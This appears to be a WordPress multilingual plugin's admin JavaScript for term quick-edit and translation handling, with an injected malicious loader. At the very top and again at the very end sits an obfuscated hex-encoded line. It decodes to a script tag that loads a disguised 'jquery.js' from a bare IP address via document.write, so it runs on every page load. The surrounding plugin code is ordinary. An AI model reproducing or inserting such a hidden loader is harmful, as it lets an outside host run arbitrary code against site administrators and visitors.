var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))// quick edit
(function( $ ) {
	$( document ).bind( 'DOMNodeInserted', function( e ) {
		var t = $( e.target );

		// WP inserts the quick edit from
		if ( 'inline-edit' == t.attr( 'id' ) ) {
			var term_id = t.prev().attr( 'id' ).replace( "tag-", "" );

			if ( term_id > 0 ) {
				// language dropdown
				var select = t.find( ':input[name="inline_lang_choice"]' );
				var lang = $( '#lang_' + term_id ).html();
				select.val( lang ); // populates the dropdown

				// disable the language dropdown for default categories
				var default_cat = $( '#default_cat_' + term_id ).html();
				if ( term_id == default_cat ) {
					select.prop( 'disabled', true );
				}
			}
		}
	});
})( jQuery );


// update rows of translated terms when adding / deleting a translation or when the language is modified in quick edit
// acts on ajaxSuccess event
(function( $ ) {
	$( document ).ajaxSuccess(function( event, xhr, settings ) {
		function update_rows( term_id ) {
			// collect old translations
			var translations = new Array;
			$( '.translation_' + term_id ).each(function() {
				translations.push( $( this ).parent().parent().attr( 'id' ).substring( 4 ) );
			});

			var data = {
				action:       'pll_update_term_rows',
				term_id:      term_id,
				translations: translations.join( ',' ),
				taxonomy:     $( "input[name='taxonomy']" ).val(),
				post_type:    $( "input[name='post_type']" ).val(),
				screen:       $( "input[name='screen']" ).val(),
				_pll_nonce:   $( '#_pll_nonce' ).val()
			}

			// get the modified rows in ajax and update them
			$.post( ajaxurl, data, function( response ) {
				if ( response ) {
					var res = wpAjax.parseAjaxResponse( response, 'ajax-response' );
					$.each( res.responses, function() {
						if ( 'row' == this.what ) {
							$( "#tag-" + this.supplemental.term_id ).replaceWith( this.data );
						}
					});
				}
			});
		}

		var data = wpAjax.unserialize( settings.data ); // what were the data sent by the ajax request?
		if ( 'undefined' != typeof( data['action'] ) ) {
			switch ( data['action'] ) {
				// when adding a term, the new term_id is in the ajax response
				case 'add-tag':
					res = wpAjax.parseAjaxResponse( xhr.responseXML, 'ajax-response' );
					$.each( res.responses, function() {
						if ( 'term' == this.what ) {
							update_rows( this.supplemental.term_id );
						}
					});

					// and also reset translations hidden input fields
					$( '.htr_lang' ).val( 0 );
				break;

				// when deleting a term
				case 'delete-tag':
					update_rows( data['tag_ID'] );
				break;

				// in case the language is modified in quick edit and breaks translations
				case 'inline-save-tax':
					update_rows( data['tax_ID'] );
				break;
			}
		}
	});
})( jQuery );

jQuery( document ).ready(function( $ ) {
	// translations autocomplete input box
	function init_translations() {
		$( '.tr_lang' ).each(function(){
			var tr_lang = $( this ).attr( 'id' ).substring( 8 );
			var td = $( this ).parent().siblings( '.pll-edit-column' );

			$( this ).autocomplete({
				minLength: 0,

				source: ajaxurl + '?action=pll_terms_not_translated' +
					'&term_language=' + $( '#term_lang_choice' ).val() +
					'&term_id=' + $( "input[name='tag_ID']" ).val() +
					'&taxonomy=' + $( "input[name='taxonomy']" ).val() +
					'&translation_language=' + tr_lang +
					'&post_type=' + typenow +
					'&_pll_nonce=' + $( '#_pll_nonce' ).val(),

				select: function( event, ui ) {
					$( '#htr_lang_' + tr_lang ).val( ui.item.id );
					td.html( ui.item.link );
				},
			});

			// when the input box is emptied
			$( this ).blur(function() {
				if ( ! $( this ).val() ) {
					$( '#htr_lang_' + tr_lang ).val( 0 );
					td.html( td.siblings( '.hidden' ).children().clone() );
				}
			});
		});
	}

	init_translations();

	// ajax for changing the term's language
	$( '#term_lang_choice' ).change(function() {
		var data = {
			action:     'term_lang_choice',
			lang:       $( this ).val(),
			from_tag:   $( "input[name='from_tag']" ).val(),
			term_id:    $( "input[name='tag_ID']" ).val(),
			taxonomy:   $( "input[name='taxonomy']" ).val(),
			post_type:  typenow,
			_pll_nonce: $( '#_pll_nonce' ).val()
		}

		$.post( ajaxurl, data, function( response ) {
			var res = wpAjax.parseAjaxResponse( response, 'ajax-response' );
			$.each( res.responses, function() {
				switch ( this.what ) {
					case 'translations': // translations fields
						$( "#term-translations" ).html( this.data );
						init_translations();
					break;
					case 'parent': // parent dropdown list for hierarchical taxonomies
						$( '#parent' ).replaceWith( this.data );
					break;
					case 'tag_cloud': // popular items
						$( '.tagcloud' ).replaceWith( this.data );
					break;
					case 'flag': // flag in front of the select dropdown
						$( '.pll-select-flag' ).html( this.data );
					break;
				}
			});
		});
	});
});
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
